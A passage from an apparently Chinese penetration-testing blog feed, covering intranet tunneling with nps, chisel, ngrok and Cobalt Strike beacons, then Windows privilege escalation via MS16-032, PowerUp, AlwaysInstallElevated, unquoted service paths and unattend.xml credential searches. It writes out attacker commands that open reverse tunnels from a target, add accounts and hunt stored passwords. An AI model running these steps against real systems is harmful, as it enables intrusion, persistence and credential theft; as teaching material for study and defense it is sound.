class="hljs-comment">#pprof_addr=0.0.0.0:9999</span><br>disconnect_timeout=60<br><br>[health_check_test1]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_http_url=/<br>health_check_type=http<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[health_check_test2]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_check_type=tcp<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[web]<br>host=c.o.com<br>target_addr=127.0.0.1:8083,127.0.0.1:8082<br><br>[tcp]<br>mode=tcp<br>target_addr=127.0.0.1:8080<br>server_port=10000<br><br>[socks5]<br>mode=socks5<br>server_port=19009<br>multi_account=multi_account.conf<br><br>[file]<br>mode=file<br>server_port=19008<br>local_path=/Users/liuhe/Downloads<br>strip_pre=/web/<br><br>[http]<br>mode=httpProxy<br>server_port=19004<br><br>[udp]<br>mode=udp<br>server_port=12253<br>target_addr=114.114.114.114:53<br><br>[ssh_secret]<br>mode=secret<br>password=ssh2<br>target_addr=123.206.77.88:22<br><br>[ssh_p2p]<br>mode=p2p<br>password=ssh3<br><br>[secret_ssh]<br>local_port=2001<br>password=ssh2<br><br>[p2p_ssh]<br>local_port=2002<br>password=ssh3<br>target_addr=123.206.77.88:22<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">server_addr   <span class="hljs-comment">#服务端ip/域名:port</span><br>conn_type       <span class="hljs-comment">#与服务端通信模式(tp或kcp)</span><br>vkey           <span class="hljs-comment">#服务端配置文件中的密钥</span><br></code></pre></td></tr></table></figure><p>配置好后直接运行即可  npc.exe<br>也可以不要配置文件运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Windows：<br>    npc.exe -server=ip:8024 -vkey=P@ssword<br>Linux：<br>    ./npc -server=xx.xx.xx.xx:8024 -vkey=P@ssword<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511235510587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在线了<br><img src="https://img-blog.csdnimg.cn/20210512000057985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210512000038984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过内网地址连接到主机</p><p><strong>chisel</strong><br>项目地址：<a href="https://github.com/jpillora/chisel/releases/tag/v1.7.4">https://github.com/jpillora/chisel/releases/tag/v1.7.4</a></p><p>Chisel 可用来搭建内网隧道，类似于常用的 frp 和 nps 之类的工具。由于目前使用的人比较少，因此对于有些杀软还不能准确的识别出该工具。chisel 可以进行端口转发、反向端口转发以及 Socks 流量代理，使用 go 语言编写，支持多个平台使用，是进行内网穿透的一个鲜为人知的好工具</p><p>工具使用：<br>这个工具和其他工还有一点不同，就是没有服务器和客户端，只有一个可执行文件。可以通过执行这个文件，让其充当服务器端或者客户端</p><p>查看帮助信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看客户端帮助信息</span><br>chisel server -<span class="hljs-built_in">help</span><br>chisel client -<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><ul><li>端口转发<br>（1）正向连接<br>在目标机上开启服务监听：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512091258690.png" alt="在这里插入图片描述"><br>在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.215:1234 1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>意思是将目标机的3389端口转发到本地的1111端口上<br><img src="https://img-blog.csdnimg.cn/2021051209140521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210512091438504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连上了。<br>（2）反向连接<br>在目标机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:1234 R:1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512092315906.png" alt="在这里插入图片描述"></p><p>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234 --reverse<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512092128746.png" alt="在这里插入图片描述"><br>在本地访问127.0.0.1就是访问的目标机的3389<br><img src="https://img-blog.csdnimg.cn/20210512092411365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>socks代理<br><img src="https://img-blog.csdnimg.cn/20210512093321254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（1）正向连接<br>在攻击上执行：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel client 192.168.43.215:12345 socks<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512105454698.png" alt="在这里插入图片描述"><br>在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512105530657.png" alt="在这里插入图片描述"></p><p>（2）反向连接<br>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345 --reverse<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512104450907.png" alt="在这里插入图片描述"><br>在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:12345 R:socks<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512104542308.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2021051210461310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在攻击上访问内网主机：<br><img src="https://img-blog.csdnimg.cn/20210512104649655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p><strong>ngrok</strong><br>  ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试<br>  特点<br>  官方维护，一般较为稳定</p><p>  跨平台，闭源</p><p>  有流量记录和重发功能</p></li></ul><p>进入ngrok官网（<a href="https://ngrok.com/%EF%BC%89%EF%BC%8C%E6%B3%A8%E5%86%8Cngrok%E8%B4%A6%E5%8F%B7">https://ngrok.com/），注册ngrok账号</a><br>创建隧道，如下<br><img src="https://img-blog.csdnimg.cn/71f87b07ff4b46caa0eb6fb8e4589a29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>将3389端口代理出来<br><img src="https://img-blog.csdnimg.cn/59db4f30326a43ab86dadd9538f4ca89.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>下载客户端<br><img src="https://img-blog.csdnimg.cn/2255684e1632434593579f0be0f5f524.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在目标机上运行客户端<br><img src="https://img-blog.csdnimg.cn/140425729e0c47b68afbe6bd90961f56.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>输入这里的id<br><img src="https://img-blog.csdnimg.cn/c833afffbefb42bc92c485466b6329d8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功<br><img src="https://img-blog.csdnimg.cn/fd1bdbbca8334f15bf0207eb15c66c6e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d0cab615406e482f87afd668246c4990.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><p><strong>smb beacon上线</strong><br>官网介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。<br>因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p><p> <strong>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</strong><br> 派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn &gt;选中对应的Listener&gt;上线<br> 或在Beacon中使用命令spawn smb（smb为我的smb listener名字)<br> <img src="https://img-blog.csdnimg.cn/9b653d1ab2054a2cbd2ba11a7d16c9e9.png" alt="在这里插入图片描述"></p></li></ul><p>使用插件，或自带端口扫描，扫描内网机器<br><img src="https://img-blog.csdnimg.cn/9e3a4a7b7c00438aa22d296d1a4811a5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f7c29fa003d544e1bc595bd78a6df2cb.png" alt="在这里插入图片描述"><br>转到视图，选择目标<br><img src="https://img-blog.csdnimg.cn/ad771c85c6474474907c57f4876054c4.png" alt="在这里插入图片描述"><br>在之前我们要先抓一波密码</p><p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接它或者unlink <ip>命令断开它</p><ul><li><p><strong>中转listener(Reverse TCP Beacon)</strong><br><img src="https://img-blog.csdnimg.cn/dd8adf72287a4423a94c314a6332ec69.png" alt="在这里插入图片描述"><br>然后和上面差不多</p></li><li><p><strong>tcp beacon正向</strong><br>SMB Beacon，TCP Beacon 与 Cobalt Strike 中派生 payload 的大多数动作相兼容。除了一些 要求显式 stager 的用户驱动的攻击（比如：Attacks → Packages 、 Attacks → Web Drive-by ）<br>生成listener<br><img src="https://img-blog.csdnimg.cn/32f4b072d8fa4d7995f986e85d8b52e6.png" alt="在这里插入图片描述"><br>在中转机器的Beacon里使用connect [ip address] [port]命令进行正向连接，即可上线<img src="https://img-blog.csdnimg.cn/1a9ea1b53bf7497683fe74422ae01e0f.png" alt="在这里插入图片描述"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网穿透</tag>
      
      <tag>内网渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网权限提升</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在windows中，权限大概分为四种，分别是User,Administrator,System,TrustedInstaller。<br>其中前三种是我们接触的最多的。</p><ul><li><strong>纵向提权</strong><br>低权限角色获得高权限角色的权限。</li><li><strong>横向提权</strong><br>获取同级别角色的权限。</li></ul><p>常见的提权方法有系统内核溢出提权，数据库提权，错误的系统配置提权，组策略首选项提权，WEB中间件漏洞提权，DLL劫持提权，溢出高权限令牌提权，第三方软件&#x2F;服务提权等。</p><h2 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h2><ul><li><strong>手动查看</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">systeminfo<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524161935996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic qfe get Caption,Description,HotFixID,InstalledOn<br></code></pre></td></tr></table></figure><p>列出已安装补丁<br><img src="https://img-blog.csdnimg.cn/20210524162301631.png" alt="在这里插入图片描述"></p><p>如果目标机存在ms16-032(KB3139914）漏洞，不仅可以利用metasploit进行提权，还能够用invoke-ms16-032.ps1脚本进行提权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">import-module Invoke-MS16-032.ps1<br>Invoke-MS16-032 -Application cmd.exe -Commandline <span class="hljs-string">&quot;/c net user test2 123.com /add&quot;</span><br></code></pre></td></tr></table></figure><ul><li><strong>利用Metasploit发现缺失补丁</strong><br>利用 post&#x2F;windows&#x2F;gather&#x2F;enum_patches 模块<br>可以根据漏洞编号快速找出系统中缺少的补丁。<br><img src="https://img-blog.csdnimg.cn/20210524172853322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>metasploit还内置了 local_exploit_suggester模块，这个模块用于快速识别系统中可能被利用的漏洞。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/multi/recon/local_exploit_suggester<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524174600621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>Powershell中的Sherlock脚本</strong><br>用于快速查找可能用于本地提权的漏洞</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\Sherlock.ps1<br>Find-AllVulns<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524175231551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>项目地址：<a href="https://github.com/rasta-mouse/Sherlock">https://github.com/rasta-mouse/Sherlock</a></p><h2 id="Windows操作系统配置错误利用分析及防范"><a href="#Windows操作系统配置错误利用分析及防范" class="headerlink" title="Windows操作系统配置错误利用分析及防范"></a>Windows操作系统配置错误利用分析及防范</h2><p>在Windows系统中，攻击者通常会通过系统内核溢出漏洞来提权，但如果碰到无法通过内核溢出漏洞提权所在服务器权限的情况，就会利用系统中的配置错误来提权，Windows操作系统的常见配置错误包括管理员凭据配置错误，服务配置错误，故意消弱的安全措施，用户权限过高等。</p><ul><li><strong>PowerUP下的实战利用</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module .\PowerUp.ps1<br>Invoke-AllChecks<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524181417745.png" alt="在这里插入图片描述"></p><ul><li><strong>Metasploit下的实战</strong><br>在metasploit中对应的模块是service_permissions，选择“AGGRESSIVE”选项，可以利用目标机器上每一个有缺陷的服务，该选项被禁用时，该模块在第一次提权成功后就会停止工作。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">use windows/local/service_permissions<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524190228309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>如果有成功利用的会自动反弹一个meterpreter(system权限)</p><ul><li><strong>注册表键 AlwayslnstallElevated</strong><br>注册表键AlwayslnstallElevated是一个策略设置项，Windows允许低权限用户以System权限运行安装文件。如果启用此策略选项，那么任何权限的用户都能以System来安装恶意的MSI文件。</li></ul><p>该漏洞产生的原因是用户开启了Windows Install特权安装功能。</p><p>利用powerup.ps1个Get-Registry AlwaysInstallElevated特权来检查注册表键是否被设置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module PowerUp.ps1<br>Get-RegistryAlwaysInstallElevated<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524193008653.png" alt="在这里插入图片描述"><br>接下来，添加账号，运行Write-UserAddMSI模块，生成MSI文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Write-UserAddMSI<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021052419325166.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q  /i UserAdd.msi<br></code></pre></td></tr></table></figure><p>这时，以普通权限运行UserAdd.msi，就会添加一个管理员账户。</p><h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a>可信任服务路径漏洞</h2><p>如果一个服务调用的可执行文件没有正确处理所引用的完整路径名，这个漏洞就会被攻击者用来上传任意可执行文件。也就是说，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就存在漏洞。<br>该漏洞存在有如下两种可能</p><ol><li>如果路径与服务有关，就任意创建一个服务或者编译Service模板</li><li>.如果路径与可执行文件有关，就任意创建一个可执行文件。</li></ol><ul><li><p><strong>Trusted Service Paths 漏洞产生的原因</strong><br>因为windows服务通常都是以System权限运行的，所有系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。<br>比如，有一个文件路径”C:\Program Files\Some Folder\Service.exe”,对于该路径中的每一个空格，Windows都会尝试寻找与空格前面的名字相匹配的程序。操作系统会对文件路径中空格所有可能情况进行尝试，直到找到能匹配的程序。<br>会尝试：<br>1.C:\Program.exe<br>2.C:\Program Files\Some.exe<br>3.C:\Program Files\Some Folder\Service.exe<br>因此，如果一个被“适当”命名的可执行程序被上传到受影响的目录中，服务一旦重启，该程序就会以System权限运行（大多数情况下）</p></li><li><p><strong>实战</strong><br>首先检查目标机器中是否存在该漏洞，使用wmic查询命令：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /V <span class="hljs-string">&quot;C:\Windows\\&quot;</span> | findstr /i /V <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210524202011358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来检查对目标文件夹的写权限。在这里使用Windows的内置工具icacls，依次检测目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">icacls <span class="hljs-string">&quot;C:\Program Files (x86)\Common Files&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210525211917284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>要是其中目录后又”Everyone:(OI)(CI)(F)”字样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Everyone:用户对这个文件夹有完全控制权限。也就是说，所有用户具有修改这个文件夹的权限。<br>(M):修改<br>(f):修改<br>(CI):从属容器将继续访问控制项<br>(OI):从属文件将继续访问控制项<br>Everyone:(OI)(CI)(F)表示对该文件夹，用户有读写，删除其下文件，删除其子目录的权限<br></code></pre></td></tr></table></figure><p>确认此漏洞后，把要上传的程序重命名并放置在存漏洞且可写的目录下，执行如下命令，尝试重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sc stop service_name<br>sc start service_name<br></code></pre></td></tr></table></figure><p>也可以使用msf中的Windows Service Trusted Path Privilege Escalation模块进行渗透测试。该模块将可执行程序放到受影响的文件夹中，然后将受影响的服务重启。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">对trusted_service_path  模块进行参数设置<br></code></pre></td></tr></table></figure><p>命令执行后，会自动反弹shell，但shell会很快中断，这是因为当以进程在windows操作系统中启动后，必须与服务控制管理器进行通信，如果没有通信，服务控制管理器会认为出现了错误，进而终止这个进程。所以在终止载荷进程之前将它迁移到其他进程中（可使用”set AutoRunScript migrate -f”命令自动迁移进程)<br><img src="https://img-blog.csdnimg.cn/20210526115850943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>自动安装配置文件</strong><br>网络管理员在内网中给多态机器配置同一个环境时，通常不会逐台配置，而会使用脚本化批量部署的方式。在这一过程中，会使用安装配置文件。这些配置文件中包含所有的安装配置信息，其中的一些还有可能包含本地管理员账号和密码等信息。这些文件如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\sysprep.inf<br>c:\sysprep\sysprep.xml<br>c:\windows\system32\sysprep.inf<br>c:\windows\system32\sysprep\sysprep.xml<br>c:\unattend.xml<br>c:\Windows\Panther\Unattend.xml<br>c:\Windows\Panther\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattended.xml<br>c:\Windows\Panther\Unattend\Unattend.xml<br>c:\windows\system32\sysprep\Unattend.xml<br>c:\windows\system32\sysprep\Panther\Unattend.xml<br></code></pre></td></tr></table></figure><p>可以直接输入如下命令搜索Unattend.xml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> /b /s c:\Unattend.xml<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527202913894.png" alt="在这里插入图片描述"></p><p>msf中也集成了该模块</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">post/windows/gather/enum_unattend<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527210257122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>计划任务</strong><br>可以使用如下命令查看计算机的计划任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527210614306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>AccessChk用于在Windows中进行一些系统或程序的高级查询，管理和故障排除工资。<br>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p><p>执行如下命令，查看指定目录的权限配置情况。如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样计划任务下次执行时，就会以高权限来运行恶意程序。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe -dqv <span class="hljs-string">&quot;c:\Microsoft&quot;</span> -accepteula<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210527211318327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>常用的AccessChk命名<br>第一次运行时会弹出一个许可证协议对话框。这里，可以使用参数 &#x2F;accepteula 自动接受许可证协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">accesschk.exe /accepteula<br></code></pre></td></tr></table></figure><p>Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。当我们作为一个低权限用户，我们首先就想要看一下“Authenticated Users”组对这些服务的权限。</p><p>找出某个驱动器下所有权限配置有缺陷的文件夹路径</p><p>accesschk.exe -uwdqs Users c:\<br>accesschk.exe -uwdqs “Authenticated Users” c:\<br><img src="https://img-blog.csdnimg.cn/2021052721220467.png" 